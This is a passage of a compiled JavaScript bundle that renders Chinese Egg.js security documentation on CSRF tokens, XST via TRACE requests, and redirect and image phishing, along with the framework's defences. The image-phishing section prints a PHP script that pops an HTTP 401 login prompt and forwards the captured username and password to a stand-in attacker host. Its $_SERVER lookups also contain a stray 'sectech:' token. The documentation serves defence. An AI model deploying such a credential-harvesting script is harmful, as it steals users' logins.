\u8868\u5355\u63d0\u4ea4\u7684\u65f6\u5019\u901a\u8fc7\u9690\u85cf\u57df\u63d0\u4ea4\u4e0a\u6765\u3002"),r.a.createElement("li",null,"Double Cookie Defense\uff1a\u5c06 token \u8bbe\u7f6e\u5728 Cookie \u4e2d\uff0c\u5728\u63d0\u4ea4\uff08POST\u3001PUT\u3001PATCH\u3001DELETE \u7b49\uff09\u8bf7\u6c42\u65f6\u63d0\u4ea4 Cookie\uff0c\u5e76\u901a\u8fc7 header \u6216\u8005 body \u5e26\u4e0a Cookie \u4e2d\u7684 token\uff0c\u670d\u52a1\u7aef\u8fdb\u884c\u5bf9\u6bd4\u6821\u9a8c\u3002"),r.a.createElement("li",null,"Custom Header\uff1a\u4fe1\u4efb\u5e26\u6709\u7279\u5b9a\u7684 header\uff08\u4f8b\u5982 ",r.a.createElement("code",null,"X-Requested-With: XMLHttpRequest"),"\uff09\u7684\u8bf7\u6c42\u3002\u8fd9\u4e2a\u65b9\u6848\u53ef\u4ee5\u88ab\u7ed5\u8fc7\uff0c\u6240\u4ee5 rails \u548c django \u7b49\u6846\u67b6\u90fd",r.a.createElement(l["Link"],{to:"https://www.djangoproject.com/weblog/2011/feb/08/security/"},"\u653e\u5f03\u4e86\u8be5\u9632\u8303\u65b9\u5f0f"),"\u3002")),r.a.createElement("p",null,"\u6846\u67b6\u7ed3\u5408\u4e86\u4e0a\u8ff0\u51e0\u79cd\u9632\u8303\u65b9\u5f0f\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53ef\u914d\u7f6e\u7684 CSRF \u9632\u8303\u7b56\u7565\u3002"),r.a.createElement("h4",{id:"\u4f7f\u7528\u65b9\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528\u65b9\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528\u65b9\u5f0f"),r.a.createElement("h5",{id:"\u540c\u6b65\u8868\u5355\u7684-csrf-\u6821\u9a8c"},r.a.createElement(l["AnchorLink"],{to:"#\u540c\u6b65\u8868\u5355\u7684-csrf-\u6821\u9a8c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u540c\u6b65\u8868\u5355\u7684 CSRF \u6821\u9a8c"),r.a.createElement("p",null,"\u5728\u540c\u6b65\u6e32\u67d3\u9875\u9762\u65f6\uff0c\u5728\u8868\u5355\u8bf7\u6c42\u4e2d\u589e\u52a0\u4e00\u4e2a name \u4e3a ",r.a.createElement("code",null,"_csrf")," \u7684 url query\uff0c\u503c\u4e3a ",r.a.createElement("code",null,"ctx.csrf"),"\uff0c\u8fd9\u6837\u7528\u6237\u5728\u63d0\u4ea4\u8fd9\u4e2a\u8868\u5355\u7684\u65f6\u5019\u4f1a\u5c06 CSRF token \u63d0\u4ea4\u4e0a\u6765\uff1a"),r.a.createElement(o["a"],{code:'<form\n  method="POST"\n  action="/upload?_csrf={{ ctx.csrf | safe }}"\n  enctype="multipart/form-data"\n>\n  title: <input name="title" /> file: <input name="file" type="file" />\n  <button type="submit">upload</button>\n</form>',lang:"html"}),r.a.createElement("p",null,"\u4f20\u9012 CSRF token \u7684\u5b57\u6bb5\u53ef\u4ee5\u5728\u914d\u7f6e\u4e2d\u6539\u53d8\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  security: {\n    csrf: {\n      queryName: '_csrf', // \u901a\u8fc7 query \u4f20\u9012 CSRF token \u7684\u9ed8\u8ba4\u5b57\u6bb5\u4e3a _csrf\n      bodyName: '_csrf', // \u901a\u8fc7 body \u4f20\u9012 CSRF token \u7684\u9ed8\u8ba4\u5b57\u6bb5\u4e3a _csrf\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u4e3a\u4e86\u9632\u8303 ",r.a.createElement(l["Link"],{to:"http://breachattack.com/"},"BREACH \u653b\u51fb"),"\uff0c\u901a\u8fc7\u540c\u6b65\u65b9\u5f0f\u6e32\u67d3\u5230\u9875\u9762\u4e0a\u7684 CSRF token \u5728\u6bcf\u6b21\u8bf7\u6c42\u65f6\u90fd\u4f1a\u53d8\u5316\uff0c",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")," \u7b49 View \u63d2\u4ef6\u4f1a\u81ea\u52a8\u5bf9 Form \u8fdb\u884c\u6ce8\u5165\uff0c\u5bf9\u5e94\u7528\u5f00\u53d1\u8005\u65e0\u611f\u77e5\u3002"),r.a.createElement("h5",{id:"ajax-\u8bf7\u6c42"},r.a.createElement(l["AnchorLink"],{to:"#ajax-\u8bf7\u6c42","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"AJAX \u8bf7\u6c42"),r.a.createElement("p",null,"\u5728 CSRF \u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0ctoken \u4f1a\u88ab\u8bbe\u7f6e\u5728 Cookie \u4e2d\uff0c\u5728 AJAX \u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4ece Cookie \u4e2d\u53d6\u5230 token\uff0c\u653e\u7f6e\u5230 query\u3001body \u6216\u8005 header \u4e2d\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\u3002"),r.a.createElement("p",null,"In jQuery:"),r.a.createElement(o["a"],{code:"var csrftoken = Cookies.get('csrfToken');\n\nfunction csrfSafeMethod(method) {\n  // these HTTP methods do not require CSRF protection\n  return /^(GET|HEAD|OPTIONS|TRACE)$/.test(method);\n}\n$.ajaxSetup({\n  beforeSend: function (xhr, settings) {\n    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {\n      xhr.setRequestHeader('x-csrf-token', csrftoken);\n    }\n  },\n});",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7 header \u4f20\u9012 CSRF token \u7684\u5b57\u6bb5\u4e5f\u53ef\u4ee5\u5728\u914d\u7f6e\u4e2d\u6539\u53d8\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  security: {\n    csrf: {\n      headerName: 'x-csrf-token', // \u901a\u8fc7 header \u4f20\u9012 CSRF token \u7684\u9ed8\u8ba4\u5b57\u6bb5\u4e3a x-csrf-token\n    },\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"session-vs-cookie-\u5b58\u50a8"},r.a.createElement(l["AnchorLink"],{to:"#session-vs-cookie-\u5b58\u50a8","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Session vs Cookie \u5b58\u50a8"),r.a.createElement("p",null,"\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u6846\u67b6\u4f1a\u5c06 CSRF token \u5b58\u5728 Cookie \u4e2d\uff0c\u4ee5\u65b9\u4fbf AJAX \u8bf7\u6c42\u83b7\u53d6\u5230\u3002\u4f46\u662f\u6240\u6709\u7684\u5b50\u57df\u540d\u90fd\u53ef\u4ee5\u8bbe\u7f6e Cookie\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u7684\u5e94\u7528\u5904\u4e8e\u65e0\u6cd5\u4fdd\u8bc1\u6240\u6709\u7684\u5b50\u57df\u540d\u90fd\u53d7\u63a7\u7684\u60c5\u51b5\u4e0b\uff0c\u5b58\u653e\u5728 Cookie \u4e2d\u53ef\u80fd\u6709\u88ab CSRF \u653b\u51fb\u7684\u98ce\u9669\u3002\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u4e2a\u914d\u7f6e\u9879\uff0c\u53ef\u4ee5\u5c06 token \u5b58\u653e\u5230 Session \u4e2d\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  security: {\n    csrf: {\n      useSession: true, // \u9ed8\u8ba4\u4e3a false\uff0c\u5f53\u8bbe\u7f6e\u4e3a true \u65f6\uff0c\u5c06\u4f1a\u628a csrf token \u4fdd\u5b58\u5230 Session \u4e2d\n      cookieName: 'csrfToken', // Cookie \u4e2d\u7684\u5b57\u6bb5\u540d\uff0c\u9ed8\u8ba4\u4e3a csrfToken\n      sessionName: 'csrfToken', // Session \u4e2d\u7684\u5b57\u6bb5\u540d\uff0c\u9ed8\u8ba4\u4e3a csrfToken\n    },\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"\u5ffd\u7565-json-\u8bf7\u6c42\u5df2\u5e9f\u5f03"},r.a.createElement(l["AnchorLink"],{to:"#\u5ffd\u7565-json-\u8bf7\u6c42\u5df2\u5e9f\u5f03","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5ffd\u7565 JSON \u8bf7\u6c42(\u5df2\u5e9f\u5f03)"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u8be5\u9009\u9879\u5df2\u5e9f\u5f03\uff0c\u653b\u51fb\u8005\u53ef\u4ee5",r.a.createElement(l["Link"],{to:"https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/"},"\u901a\u8fc7 flash + 307 \u6765\u653b\u7834"),"\uff0c\u8bf7\u4e0d\u8981\u5728\u751f\u4ea7\u73af\u5883\u6253\u5f00\u6539\u9009\u9879\uff01")),r.a.createElement("p",null,"\u5728 ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/Same-origin_policy"},"SOP")," \u7684\u5b89\u5168\u7b56\u7565\u4fdd\u62a4\u4e0b\uff0c\u57fa\u672c\u4e0a\u6240\u6709\u7684\u73b0\u4ee3\u6d4f\u89c8\u5668\u90fd\u4e0d\u5141\u8bb8\u8de8\u57df\u53d1\u8d77 content-type \u4e3a JSON \u7684\u8bf7\u6c42\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u653e\u8fc7\u7c7b\u578b\u7684 JSON \u683c\u5f0f\u7684\u8bf7\u6c42\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  security: {\n    csrf: {\n      ignoreJSON: true, // \u9ed8\u8ba4\u4e3a false\uff0c\u5f53\u8bbe\u7f6e\u4e3a true \u65f6\uff0c\u5c06\u4f1a\u653e\u8fc7\u6240\u6709 content-type \u4e3a `application/json` \u7684\u8bf7\u6c42\n    },\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"\u5237\u65b0-csrf-token"},r.a.createElement(l["AnchorLink"],{to:"#\u5237\u65b0-csrf-token","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5237\u65b0 CSRF token"),r.a.createElement("p",null,"\u5f53 CSRF token \u5b58\u50a8\u5728 Cookie \u4e2d\u65f6\uff0c\u4e00\u65e6\u5728\u540c\u4e00\u4e2a\u6d4f\u89c8\u5668\u4e0a\u53d1\u751f\u7528\u6237\u5207\u6362\uff0c\u65b0\u767b\u9646\u7684\u7528\u6237\u5c06\u4f1a\u4f9d\u65e7\u4f7f\u7528\u65e7\u7684 token\uff08\u4e4b\u524d\u7528\u6237\u4f7f\u7528\u7684\uff09\uff0c\u8fd9\u4f1a\u5e26\u6765\u4e00\u5b9a\u7684\u5b89\u5168\u98ce\u9669\uff0c\u56e0\u6b64\u5728\u6bcf\u6b21\u7528\u6237\u767b\u9646\u7684\u65f6\u5019\u90fd",r.a.createElement("strong",null,"\u5fc5\u987b\u5237\u65b0 CSRF token"),"\u3002"),r.a.createElement(o["a"],{code:"// login controller\nexports.login = function* (ctx) {\n  const { username, password } = ctx.request.body;\n  const user = yield ctx.service.user.find({ username, password });\n  if (!user) ctx.throw(403);\n  ctx.session = { user };\n\n  // \u8c03\u7528 rotateCsrfSecret \u5237\u65b0\u7528\u6237\u7684 CSRF token\n  ctx.rotateCsrfSecret();\n\n  ctx.body = { success: true };\n};",lang:"js"}),r.a.createElement("h2",{id:"\u5b89\u5168\u5a01\u80c1-xst-\u7684\u9632\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u5168\u5a01\u80c1-xst-\u7684\u9632\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u5168\u5a01\u80c1 XST \u7684\u9632\u8303"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/XST"},"XST")," \u7684\u5168\u79f0\u662f ",r.a.createElement("code",null,"Cross-Site Tracing"),"\uff0c\u5ba2\u6237\u7aef\u53d1 TRACE \u8bf7\u6c42\u81f3\u670d\u52a1\u5668\uff0c\u5982\u679c\u670d\u52a1\u5668\u6309\u7167\u6807\u51c6\u5b9e\u73b0\u4e86 TRACE \u54cd\u5e94\uff0c\u5219\u5728 response body \u91cc\u4f1a\u8fd4\u56de\u6b64\u6b21\u8bf7\u6c42\u7684\u5b8c\u6574\u5934\u4fe1\u606f\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u83b7\u53d6\u67d0\u4e9b\u654f\u611f\u7684\u5934\u5b57\u6bb5\uff0c\u4f8b\u5982 httpOnly \u7684 Cookie\u3002"),r.a.createElement("p",null,"\u4e0b\u9762\u6211\u4eec\u57fa\u4e8e Koa \u6765\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u652f\u6301 TRACE \u65b9\u6cd5\u7684\u670d\u52a1\u5668\uff1a"),r.a.createElement(o["a"],{code:"var koa = require('koa');\nvar app = koa();\n\napp.use(function* (next) {\n  this.cookies.set('a', 1, { httpOnly: true });\n  if (this.method === 'TRACE') {\n    var body = '';\n    for (header in this.headers) {\n      body += header + ': ' + this.headers[header] + '\\r\\n';\n    }\n    this.body = body;\n  }\n  yield* next;\n});\n\napp.listen(7001);",lang:"javascript"}),r.a.createElement("p",null,"\u542f\u52a8\u670d\u52a1\u540e\uff0c\u5148\u53d1\u4e2a GET \u8bf7\u6c42 ",r.a.createElement("code",null,"curl -i http://127.0.0.1:7001"),"\uff0c\u5f97\u5230\u5982\u4e0b\u54cd\u5e94\uff1a"),r.a.createElement(o["a"],{code:"HTTP/1.1 200 OK\nX-Powered-By: koa\nSet-Cookie: a=1; path=/; httponly\nContent-Type: text/plain; charset=utf-8\nContent-Length: 2\nDate: Thu, 06 Nov 2014 05:04:42 GMT\nConnection: keep-alive\n\nOK",lang:"unknown"}),r.a.createElement("p",null,"\u670d\u52a1\u5668\u8bbe\u7f6e\u4e86\u4e00\u4e2a httpOnly \u7684 Cookie \u4e3a 1\uff0c\u5728\u6d4f\u89c8\u5668\u73af\u5883\u4e2d\uff0c\u662f\u65e0\u6cd5\u901a\u8fc7\u811a\u672c\u83b7\u53d6\u5b83\u7684\u3002"),r.a.createElement("p",null,"\u63a5\u7740\u6211\u4eec\u53d1 TRACE \u8bf7\u6c42\u5230\u670d\u52a1\u5668",r.a.createElement("code",null,"curl -X TRACE -b a=1 -i http://127.0.0.1:7001"),"\uff0c\u5e76\u5e26\u4e0a Cookie\uff0c\u5f97\u5230\u5982\u4e0b\u54cd\u5e94\uff1a"),r.a.createElement(o["a"],{code:"HTTP/1.1 200 OK\n  X-Powered-By: koa\n  Set-Cookie: a=1; path=/; httponly\n  Content-Type: text/plain; charset=utf-8\n  Content-Length: 73\n  Date: Thu, 06 Nov 2014 05:07:47 GMT\n  Connection: keep-alive\n\n  user-agent: curl/7.37.1\n  host: 127.0.0.1:7001\n  accept: */*\n  cookie: a=1",lang:"unknown"}),r.a.createElement("p",null,"\u5728\u54cd\u5e94\u4f53\u91cc\u53ef\u4ee5\u770b\u5230\u5b8c\u6574\u7684\u5934\u4fe1\u606f\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u7ed5\u8fc7\u4e86 httpOnly \u7684\u9650\u5236\uff0c\u62ff\u5230\u4e86 cookie=1\uff0c\u9020\u6210\u4e86\u5f88\u5927\u7684\u98ce\u9669\u3002"),r.a.createElement("h3",{id:"\u62d3\u5c55\u9605\u8bfb"},r.a.createElement(l["AnchorLink"],{to:"#\u62d3\u5c55\u9605\u8bfb","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u62d3\u5c55\u9605\u8bfb"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html"},"http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/"},"http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/")),r.a.createElement("h3",{id:"\u9632\u8303\u65b9\u5f0f-3"},r.a.createElement(l["AnchorLink"],{to:"#\u9632\u8303\u65b9\u5f0f-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9632\u8303\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u5df2\u7ecf\u7981\u6b62\u4e86 trace\uff0ctrack\uff0coptions \u4e09\u79cd\u5371\u9669\u7c7b\u578b\u8bf7\u6c42\u3002"),r.a.createElement("h2",{id:"\u5b89\u5168\u5a01\u80c1-\u9493\u9c7c\u653b\u51fb-\u7684\u9632\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u5168\u5a01\u80c1-\u9493\u9c7c\u653b\u51fb-\u7684\u9632\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u5168\u5a01\u80c1 ",r.a.createElement("code",null,"\u9493\u9c7c\u653b\u51fb")," \u7684\u9632\u8303"),r.a.createElement("p",null,"\u9493\u9c7c\u6709\u591a\u79cd\u65b9\u5f0f\uff0c\u8fd9\u91cc\u4ecb\u7ecd url \u9493\u9c7c\u3001\u56fe\u7247\u9493\u9c7c\u548c iframe \u9493\u9c7c\u3002"),r.a.createElement("h3",{id:"url-\u9493\u9c7c"},r.a.createElement(l["AnchorLink"],{to:"#url-\u9493\u9c7c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"url \u9493\u9c7c"),r.a.createElement("p",null,"\u670d\u52a1\u7aef\u672a\u5bf9\u4f20\u5165\u7684\u8df3\u8f6c url \u53d8\u91cf\u8fdb\u884c\u68c0\u67e5\u548c\u63a7\u5236\uff0c\u53ef\u80fd\u5bfc\u81f4\u53ef\u6076\u610f\u6784\u9020\u4efb\u610f\u4e00\u4e2a\u6076\u610f\u5730\u5740\uff0c\u8bf1\u5bfc\u7528\u6237\u8df3\u8f6c\u5230\u6076\u610f\u7f51\u7ad9\u3002 \u7531\u4e8e\u662f\u4ece\u53ef\u4fe1\u7684\u7ad9\u70b9\u8df3\u8f6c\u51fa\u53bb\u7684\uff0c\u7528\u6237\u4f1a\u6bd4\u8f83\u4fe1\u4efb\uff0c\u6240\u4ee5\u8df3\u8f6c\u6f0f\u6d1e\u4e00\u822c\u7528\u4e8e\u9493\u9c7c\u653b\u51fb\uff0c\u901a\u8fc7\u8f6c\u5230\u6076\u610f\u7f51\u7ad9\u6b3a\u9a97\u7528\u6237\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u76d7\u53d6\u7528\u6237\u4fe1\u606f\uff0c\u6216\u6b3a\u9a97\u7528\u6237\u8fdb\u884c\u91d1\u94b1\u4ea4\u6613\uff1b \u4e5f\u53ef\u80fd\u5f15\u53d1\u7684 XSS \u6f0f\u6d1e\uff08\u4e3b\u8981\u662f\u8df3\u8f6c\u5e38\u5e38\u4f7f\u7528 302 \u8df3\u8f6c\uff0c\u5373\u8bbe\u7f6e HTTP \u54cd\u5e94\u5934\uff0cLocatioin: url\uff0c\u5982\u679c url \u5305\u542b\u4e86 CRLF\uff0c\u5219\u53ef\u80fd\u9694\u65ad\u4e86 HTTP \u54cd\u5e94\u5934\uff0c\u4f7f\u5f97\u540e\u9762\u90e8\u5206\u843d\u5230\u4e86 HTTP body\uff0c\u4ece\u800c\u5bfc\u81f4 XSS \u6f0f\u6d1e\uff09\u3002"),r.a.createElement("h3",{id:"\u9632\u8303\u65b9\u5f0f-4"},r.a.createElement(l["AnchorLink"],{to:"#\u9632\u8303\u65b9\u5f0f-4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9632\u8303\u65b9\u5f0f"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u82e5\u8df3\u8f6c\u7684 url \u4e8b\u5148\u662f\u53ef\u4ee5\u786e\u5b9a\u7684\uff0c\u5305\u62ec url \u548c\u53c2\u6570\u7684\u503c\uff0c\u5219\u53ef\u4ee5\u5728\u540e\u53f0\u5148\u914d\u7f6e\u597d\uff0curl \u53c2\u6570\u53ea\u9700\u4f20\u5bf9\u5e94 url \u7684\u7d22\u5f15\u5373\u53ef\uff0c\u901a\u8fc7\u7d22\u5f15\u627e\u5230\u5bf9\u5e94\u5177\u4f53 url \u518d\u8fdb\u884c\u8df3\u8f6c\uff1b"),r.a.createElement("li",null,"\u82e5\u8df3\u8f6c\u7684 url \u4e8b\u5148\u4e0d\u786e\u5b9a\uff0c\u4f46\u5176\u8f93\u5165\u662f\u7531\u540e\u53f0\u751f\u6210\u7684\uff08\u4e0d\u662f\u7528\u6237\u901a\u8fc7\u53c2\u6570\u4f20\u4eba\uff09\uff0c\u5219\u53ef\u4ee5\u5148\u751f\u6210\u597d\u8df3\u8f6c\u94fe\u63a5\u7136\u540e\u8fdb\u884c\u7b7e\u540d\uff1b"),r.a.createElement("li",null,"\u82e5 1 \u548c 2 \u90fd\u4e0d\u6ee1\u8db3\uff0curl \u4e8b\u5148\u65e0\u6cd5\u786e\u5b9a\uff0c\u53ea\u80fd\u901a\u8fc7\u524d\u7aef\u53c2\u6570\u4f20\u5165\uff0c\u5219\u5fc5\u987b\u5728\u8df3\u8f6c\u7684\u65f6\u5019\u5bf9 url \u8fdb\u884c\u6309\u89c4\u5219\u6821\u9a8c\uff1a\u5224\u65ad url \u662f\u5426\u5728\u5e94\u7528\u6388\u6743\u7684\u767d\u540d\u5355\u5185\u3002")),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u5b89\u5168\u8df3\u8f6c\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u767d\u540d\u5355\u907f\u514d\u8fd9\u79cd\u98ce\u9669\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.redirect(url)")," \u5982\u679c\u4e0d\u5728\u914d\u7f6e\u7684\u767d\u540d\u5355\u5185\uff0c\u5219\u7981\u6b62\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.unsafeRedirect(url)")," \u4e00\u822c\u4e0d\u5efa\u8bae\u4f7f\u7528\uff0c\u660e\u786e\u4e86\u89e3\u53ef\u80fd\u5e26\u6765\u7684\u98ce\u9669\u540e\u4f7f\u7528\u3002")),r.a.createElement("p",null,"\u5b89\u5168\u65b9\u6848\u8986\u76d6\u4e86\u9ed8\u8ba4\u7684",r.a.createElement("code",null,"ctx.redirect"),"\u65b9\u6cd5\uff0c\u6240\u6709\u7684\u8df3\u8f6c\u5747\u4f1a\u7ecf\u8fc7\u5b89\u5168\u57df\u540d\u7684\u5224\u65ad\u3002"),r.a.createElement("p",null,"\u7528\u6237\u5982\u679c\u4f7f\u7528",r.a.createElement("code",null,"ctx.redirect"),"\u65b9\u6cd5\uff0c\u9700\u8981\u5728\u5e94\u7528\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u505a\u5982\u4e0b\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.security = {\n  domainWhiteList: ['.domain.com'], // \u5b89\u5168\u767d\u540d\u5355\uff0c\u4ee5 . \u5f00\u5934\n};",lang:"js"}),r.a.createElement("p",null,"\u82e5\u7528\u6237\u6ca1\u6709\u914d\u7f6e ",r.a.createElement("code",null,"domainWhiteList")," \u6216\u8005 ",r.a.createElement("code",null,"domainWhiteList"),"\u6570\u7ec4\u5185\u4e3a\u7a7a\uff0c\u5219\u9ed8\u8ba4\u4f1a\u5bf9\u6240\u6709\u8df3\u8f6c\u8bf7\u6c42\u653e\u884c\uff0c\u5373\u7b49\u540c\u4e8e",r.a.createElement("code",null,"ctx.unsafeRedirect(url)")),r.a.createElement("h3",{id:"\u56fe\u7247\u9493\u9c7c"},r.a.createElement(l["AnchorLink"],{to:"#\u56fe\u7247\u9493\u9c7c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u56fe\u7247\u9493\u9c7c"),r.a.createElement("p",null,"\u5982\u679c\u53ef\u4ee5\u5141\u8bb8\u7528\u6237\u5411\u7f51\u9875\u91cc\u63d2\u5165\u672a\u7ecf\u9a8c\u8bc1\u7684\u5916\u94fe\u56fe\u7247\uff0c\u8fd9\u6709\u53ef\u80fd\u51fa\u73b0\u9493\u9c7c\u98ce\u9669\u3002"),r.a.createElement("p",null,"\u6bd4\u5982\u5e38\u89c1\u7684 ",r.a.createElement("code",null,"401\u9493\u9c7c"),", \u653b\u51fb\u8005\u5728\u8bbf\u95ee\u9875\u9762\u65f6\uff0c\u9875\u9762\u5f39\u51fa\u9a8c\u8bc1\u9875\u9762\u8ba9\u7528\u6237\u8f93\u5165\u5e10\u53f7\u53ca\u5bc6\u7801\uff0c\u5f53\u7528\u6237\u8f93\u5165\u4e4b\u540e\uff0c\u5e10\u53f7\u53ca\u5bc6\u7801\u5c31\u5b58\u50a8\u5230\u4e86\u9ed1\u5ba2\u7684\u670d\u52a1\u5668\u4e2d\u3002 \u901a\u5e38\u8fd9\u79cd\u60c5\u51b5\u4f1a\u51fa\u73b0\u5728",r.a.createElement("code",null,"<img src=$url />"),"\u4e2d\uff0c\u7cfb\u7edf\u4e0d\u5bf9",r.a.createElement("code",null,"$url"),"\u662f\u5426\u5728\u57df\u540d\u767d\u540d\u5355\u5185\u8fdb\u884c\u6821\u9a8c\u3002"),r.a.createElement("p",null,"\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e2d\u6784\u9020\u4ee5\u4e0b\u4ee3\u7801\uff1a"),r.a.createElement("p",null,"401.php\uff1a\u4f5c\u7528\u4e3a\u5f39\u51fa 401 \u7a97\u53e3\uff0c\u5e76\u4e14\u8bb0\u5f55\u7528\u6237\u4fe1\u606f\u3002"),r.a.createElement(o["a"],{code:"<?php\n      header('WWW-Authenticate: Basic realm=\"No authorization\"');\n      header('HTTP/1.1 401 Unauthorized');\n          $domain = \"http://hacker.com/fishing/\";\n          if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){\n                  header(\"Location: \".$domain.\"record.php?a=\".$_SERVER[sectech:'PHP_AUTH_USER'].\"&b=\".$_SERVER[sectech:'PHP_AUTH_PW']);\n          }\n  ?>",lang:"php"}),r.a.createElement("p",null,"\u4e4b\u540e\u653b\u51fb\u8005\u751f\u6210\u4e00\u4e2a\u56fe\u7247\u94fe\u63a5",r.a.createElement("code",null,'<img src="http://xxx.xxx.xxx/fishing/401.php?a.jpg//" /> '),"\u3002"),r.a.createElement("p",null,"\u5f53\u7528\u6237\u8bbf\u95ee\u65f6\uff0c\u4f1a\u5f39\u51fa\u4fe1\u606f\u8ba9\u7528\u6237\u70b9\u51fb\uff0c\u7528\u6237\u8f93\u5165\u7684\u7528\u6237\u540d\u53ca\u5bc6\u7801\u4f1a\u88ab\u9ed1\u5ba2\u7684\u670d\u52a1\u5668\u5077\u5077\u8bb0\u5f55\u3002"),r.a.createElement("h3",{id:"\u9632\u8303\u65b9\u5f0f-5"},r.a.createElement(l["AnchorLink"],{to:"#\u9632\u8303\u65b9\u5f0f-5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9632\u8303\u65b9\u5f0f"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,".surl()")," \u5b8f\u505a url \u8fc7\u6ee4\u3002"),r.a.createElement("p",null,"\u7528\u4e8e\u5728 html \u6807\u7b7e\u4e2d\u4e2d\u8981\u89e3\u6790 url \u7684\u5730\u65b9\uff08\u6bd4\u5982 ",r.a.createElement("code",null,'<a href=""/><img src=""/>'),"\uff09\uff0c\u5176\u4ed6\u5730\u65b9\u4e0d\u5141\u8bb8\u4f7f\u7528\u3002"),r.a.createElement("p",null,"\u5bf9\u6a21\u677f\u4e2d\u8981\u8f93\u51fa\u7684\u53d8\u91cf\uff0c\u52a0 ",r.a.createElement("code",null,"helper.surl($value)"),"\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5728\u9700\u8981\u89e3\u6790 url \u7684\u5730\u65b9\uff0csurl \u5916\u9762\u4e00\u5b9a\u8981\u52a0\u4e0a\u53cc\u5f15\u53f7\uff0c\u5426\u5219\u5c31\u4f1a\u5bfc\u81f4 XSS \u6f0f\u6d1e\u3002")),r.a.createElement("p",null,"\u4e0d\u4f7f\u7528 surl"),r.a.createElement(o["a"],{code:'<a href="$value" />',lang:"html"}),r.a.createElement("p",null,"output:"),r.a.createElement(o["a"],{code:'<a href="http://ww.safe.com<script>" />',lang:"html"}),r.a.createElement("p",null,"\u4f7f\u7528 surl"),r.a.createElement(o["a"],{code:'<a href="helper.surl($value)" />',lang:"html"}),r.a.createElement("p",null,"output:"),r.a.createElement(o["a"],{code:'<a href="http://ww.safe.com&lt;script&gt;" 